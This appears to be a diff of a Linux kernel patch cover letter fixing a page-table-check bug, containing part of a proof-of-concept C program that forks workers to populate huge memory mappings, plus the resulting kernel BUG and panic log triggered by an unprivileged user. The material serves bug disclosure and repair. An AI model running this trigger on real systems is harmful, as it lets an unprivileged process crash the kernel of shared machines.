+		fprintf(stderr, "[%d] mmap(%llu GB) failed: %s\n", getpid(),
+			gigabytes, strerror(errno));
+		_exit(1);
+	}
+
+	if (madvise(addr, len, MADV_NOHUGEPAGE) != 0) {
+		fprintf(stderr, "[%d] MADV_NOHUGEPAGE failed: %s\n", getpid(),
+			strerror(errno));
+		_exit(1);
+	}
+
+	fprintf(stderr, "[%d] populating %llu GB at %p\n", getpid(), gigabytes,
+		addr);
+	fflush(stderr);
+
+	if (madvise(addr, len, MADV_POPULATE_READ) != 0) {
+		fprintf(stderr, "[%d] MADV_POPULATE_READ failed: %s\n", getpid(),
+			strerror(errno));
+		_exit(1);
+	}
+
+	fprintf(stderr, "[%d] populated; holding mapping\n", getpid());
+	fflush(stderr);
+	for (;;)
+		pause();
+}
+
+int main(void)
+{
+	const unsigned long long workers = env_ull("POC_WORKERS", 16);
+	const unsigned long long gigabytes = env_ull("POC_GB_PER_WORKER", 513);
+	const unsigned long long base_addr_tb = env_ull("POC_BASE_ADDR_TB", 4);
+	pid_t *pids;
+	int sync_pipe[2];
+	unsigned long long i;
+
+	if (workers == 0 || gigabytes == 0) {
+		fprintf(stderr, "POC_WORKERS and POC_GB_PER_WORKER must be > 0\n");
+		return 2;
+	}
+
+	printf("workers=%llu gb_per_worker=%llu total_gb=%llu base_addr_tb=%llu\n",
+	       workers, gigabytes, workers * gigabytes, base_addr_tb);
+	fflush(stdout);
+
+	pids = calloc(workers, sizeof(*pids));
+	if (!pids) {
+		perror("calloc");
+		return 1;
+	}
+
+	if (pipe(sync_pipe) != 0) {
+		perror("pipe");
+		return 1;
+	}
+
+	for (i = 0; i < workers; i++) {
+		pid_t pid = fork();
+
+		if (pid < 0) {
+			perror("fork");
+			return 1;
+		}
+		if (pid == 0) {
+			close(sync_pipe[1]);
+			worker(sync_pipe[0], gigabytes, base_addr_tb);
+		}
+		pids[i] = pid;
+	}
+
+	close(sync_pipe[0]);
+	close(sync_pipe[1]);
+
+	for (;;) {
+		int status;
+		pid_t pid = wait(&status);
+
+		if (pid < 0) {
+			if (errno == EINTR)
+				continue;
+			perror("wait");
+			return 1;
+		}
+
+		if (WIFEXITED(status))
+			fprintf(stderr, "child %d exited with status %d\n", pid,
+				WEXITSTATUS(status));
+		else if (WIFSIGNALED(status))
+			fprintf(stderr, "child %d killed by signal %d\n", pid,
+				WTERMSIG(status));
+		fflush(stderr);
+	}
+}
+
+------END poc.c--------
+
+----BEGIN crash log----
+
+[ 1513.218556][T10794] kernel BUG at mm/page_table_check.c:121!
+[ 1513.219101][T10785] kernel BUG at mm/page_table_check.c:121!
+[ 1513.219102][T10787] kernel BUG at mm/page_table_check.c:121!
+[ 1513.219103][T10795] kernel BUG at mm/page_table_check.c:121!
+[ 1513.219106][T10791] kernel BUG at mm/page_table_check.c:121!
+[ 1513.219146][T10785] Oops: invalid opcode: 0000 [#1] SMP KASAN NOPTI
+[ 1513.219173][T10785] CPU: 4 UID: 1028 PID: 10785 Comm: poc Tainted: G        W           7.0.0-08308-g9e1e9d660255 #1 PREEMPT(full)
+[ 1513.219181][T10785] Tainted: [W]=WARN
+[ 1513.219184][T10785] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
+[ 1513.219191][T10785] RIP: 0010:page_table_check_set+0x47a/0x660
+[ 1513.219223][T10785] Code: c0 0f 85 83 00 00 00 49 8d 7d 04 be 04 00 00 00 e8 bb bc f5 ff b8 01 00 00 00 f0 41 0f c1 45 04 83 c0 01 0f 89 bf fe ff ff 90 <0f> 0b 48 89 ef e8 3c ee ff ff 48 89 c3 e9 cd fe ff ff e8 af b2 74
+[ 1513.219227][T10785] RSP: 0018:ffa00000174df708 EFLAGS: 00010282
+[ 1513.219233][T10785] RAX: 0000000080000004 RBX: ff11000100cf9e70 RCX: ffffffff82272c45
+[ 1513.219236][T10785] RDX: ffe21c002019f3d8 RSI: 0000000000000004 RDI: ff11000100cf9ebc
+[ 1513.219239][T10785] RBP: 00000000000131fc R08: 0000000000000001 R09: ffe21c002019f3d7
+[ 1513.219242][T10785] R10: ff11000100cf9ebf R11: 0000000000000007 R12: 0000000000000000
+[ 1513.219245][T10785] R13: ff11000100cf9eb8 R14: dffffc0000000000 R15: 00000000000131fd
+[ 1513.219249][T10785] FS:  00007f4996890780(0000) GS:ff110005d0a68000(0000) knlGS:0000000000000000
+[ 1513.219255][T10785] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[ 1513.219258][T10785] CR2: 00005606316be348 CR3: 00000001a2981000 CR4: 0000000000751ef0
+[ 1513.219261][T10785] PKRU: 55555554
+[ 1513.219263][T10785] Call Trace:
+[ 1513.219266][T10785]  <TASK>
+[ 1513.219275][T10785]  __page_table_check_ptes_set+0x19e/0x310
+[ 1513.219281][T10785]  ? __pfx___page_table_check_ptes_set+0x10/0x10
+[ 1513.219288][T10785]  ? __pfx_pfn_pte+0x10/0x10
+[ 1513.219302][T10785]  do_anonymous_page+0x11f3/0x1df0
+[ 1513.219311][T10785]  ? srso_alias_return_thunk+0x5/0xfbef5
+[ 1513.219322][T10785]  ? srso_alias_return_thunk+0x5/0xfbef5
+[ 1513.219330][T10785]  __handle_mm_fault+0x151f/0x1f90
+[ 1513.219337][T10785]  ? srso_alias_return_thunk+0x5/0xfbef5
+[ 1513.219343][T10785]  ? __pfx_do_raw_spin_lock+0x10/0x10
+[ 1513.219357][T10785]  ? __pfx___handle_mm_fault+0x10/0x10
+[ 1513.219365][T10785]  ? pte_offset_map_lock+0xf5/0x260
+[ 1513.219370][T10785]  ? srso_alias_return_thunk+0x5/0xfbef5
+[ 1513.219375][T10785]  ? find_held_lock+0x2b/0x80
+[ 1513.219388][T10785]  ? srso_alias_return_thunk+0x5/0xfbef5
+[ 1513.219392][T10785]  ? follow_page_pte+0x3fb/0xf50
+[ 1513.219402][T10785]  handle_mm_fault+0x2ad/0x8c0
+[ 1513.219413][T10785]  __get_user_pages+0x3b5/0x29a0
+[ 1513.219428][T10785]  ? __pfx___get_user_pages+0x10/0x10
+[ 1513.219434][T10785]  ? rcu_is_watching+0x12/0xc0
+[ 1513.219444][T10785]  ? srso_alias_return_thunk+0x5/0xfbef5
+[ 1513.219487][T10785]  faultin_page_range+0x276/0x6c0
+[ 1513.219493][T10785]  ? srso_alias_return_thunk+0x5/0xfbef5
+[ 1513.219501][T10785]  madvise_do_behavior+0x2ce/0x4a0
+[ 1513.219513][T10785]  ? __pfx_madvise_do_behavior+0x10/0x10
+[ 1513.219520][T10785]  ? down_read+0x142/0x460
+[ 1513.219548][T10785]  ? srso_alias_return_thunk+0x5/0xfbef5
+[ 1513.219552][T10785]  ? rw_verify_area+0x71/0x560
+[ 1513.219563][T10785]  do_madvise+0x12e/0x1b0
+[ 1513.219569][T10785]  ? __pfx_do_madvise+0x10/0x10
+[ 1513.219574][T10785]  ? __pfx_vfs_write+0x10/0x10
+[ 1513.219595][T10785]  ? __pfx_ksys_write+0x10/0x10
+[ 1513.219605][T10785]  __x64_sys_madvise+0xa9/0x110
+[ 1513.219609][T10785]  ? srso_alias_return_thunk+0x5/0xfbef5
+[ 1513.219614][T10785]  ? lockdep_hardirqs_on+0x7b/0x110
+[ 1513.219620][T10785]  do_syscall_64+0x116/0xf80
+[ 1513.219628][T10785]  ? irqentry_exit+0x117/0x830
+[ 1513.219636][T10785]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
+[ 1513.219640][T10785] RIP: 0033:0x7f499699fbf7
+[ 1513.219659][T10785] Code: ff e8 2d 7d ff ff 48 8b 54 24 28 64 48 2b 14 25 28 00 00 00 75 05 48 83 c4 38 c3 e8 f3 ff 00 00 0f 1f 00 b8 1c 00 00 00 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 8b 0d e9 81 0d 00 f7 d8 64 89 01 48
+[ 1513.219663][T10785] RSP: 002b:00007ffc39138e78 EFLAGS: 00000202 ORIG_RAX: 000000000000001c
+[ 1513.219668][T10785] RAX: ffffffffffffffda RBX: 0000040000000000 RCX: 00007f499699fbf7
+[ 1513.219671][T10785] RDX: 0000000000000016 RSI: 0000008040000000 RDI: 0000040000000000
+[ 1513.219674][T10785] RBP: 0000008040000000 R08: 0000000000000000 R09: 0000000000000000
+[ 1513.219677][T10785] R10: 0000000000000000 R11: 0000000000000202 R12: 0000000000000201
+[ 1513.219679][T10785] R13: 0000040000000000 R14: 0000000000000002 R15: 00005575774bbd18
+[ 1513.219706][T10785]  </TASK>
+[ 1513.219708][T10785] Modules linked in:
+[ 1513.219718][T10785] ---[ end trace 0000000000000000 ]---
+[ 1513.219719][T10795] Oops: invalid opcode: 0000 [#2] SMP KASAN NOPTI
+[ 1513.219722][T10785] RIP: 0010:page_table_check_set+0x47a/0x660
+[ 1513.219728][T10785] Code: c0 0f 85 83 00 00 00 49 8d 7d 04 be 04 00 00 00 e8 bb bc f5 ff b8 01 00 00 00 f0 41 0f c1 45 04 83 c0 01 0f 89 bf fe ff ff 90 <0f> 0b 48 89 ef e8 3c ee ff ff 48 89 c3 e9 cd fe ff ff e8 af b2 74
+[ 1513.219732][T10785] RSP: 0018:ffa00000174df708 EFLAGS: 00010282
+[ 1513.219730][T10795] CPU: 7 UID: 1028 PID: 10795 Comm: poc Tainted: G      D W           7.0.0-08308-g9e1e9d660255 #1 PREEMPT(full)
+[ 1513.219736][T10785]
+[ 1513.219740][T10795] Tainted: [D]=DIE, [W]=WARN
+[ 1513.219739][T10785] RAX: 0000000080000004 RBX: ff11000100cf9e70 RCX: ffffffff82272c45
+[ 1513.219743][T10795] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
+[ 1513.219744][T10785] RDX: ffe21c002019f3d8 RSI: 0000000000000004 RDI: ff11000100cf9ebc
+[ 1513.219748][T10785] RBP: 00000000000131fc R08: 0000000000000001 R09: ffe21c002019f3d7
+[ 1513.219752][T10785] R10: ff11000100cf9ebf R11: 0000000000000007 R12: 0000000000000000
+[ 1513.219748][T10795] RIP: 0010:page_table_check_set+0x47a/0x660
+[ 1513.219755][T10785] R13: ff11000100cf9eb8 R14: dffffc0000000000 R15: 00000000000131fd
+[ 1513.219760][T10795] Code: c0 0f 85 83 00 00 00 49 8d 7d 04 be 04 00 00 00 e8 bb bc f5 ff b8 01 00 00 00 f0 41 0f c1 45 04 83 c0 01 0f 89 bf fe ff ff 90 <0f> 0b 48 89 ef e8 3c ee ff ff 48 89 c3 e9 cd fe ff ff e8 af b2 74
+[ 1513.219761][T10785] FS:  00007f4996890780(0000) GS:ff110005d0a68000(0000) knlGS:0000000000000000
+[ 1513.219764][T10795] RSP: 0018:ffa00000172ef708 EFLAGS: 00010286
+[ 1513.219767][T10785] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[ 1513.219768][T10795]
+[ 1513.219771][T10795] RAX: 0000000080000003 RBX: ff11000100cf9e70 RCX: ffffffff82272c45
+[ 1513.219772][T10785] CR2: 00005606316be348 CR3: 00000001a2981000 CR4: 0000000000751ef0
+[ 1513.219775][T10795] RDX: ffe21c002019f3d8 RSI: 0000000000000004 RDI: ff11000100cf9ebc
+[ 1513.219776][T10785] PKRU: 55555554
+[ 1513.219779][T10795] RBP: 00000000000131fc R08: 0000000000000001 R09: ffe21c002019f3d7
+[ 1513.219781][T10785] Kernel panic - not syncing: Fatal exception
+[ 1514.282927][T10785] Shutting down cpus with NMI
+[ 1514.283092][T10785] Kernel Offset: disabled
+
+-----END crash log-----
+
+Best regards,
+Zhiling Zou
+
+Zhiling Zou (1):
+  mm/page_table_check: skip zero pages
+
+ mm/page_table_check.c | 4 ++--
+ 1 file changed, 2 insertions(+), 2 deletions(-)
 
 -- 
-Cheers,
+2.43.0
 
-David
 
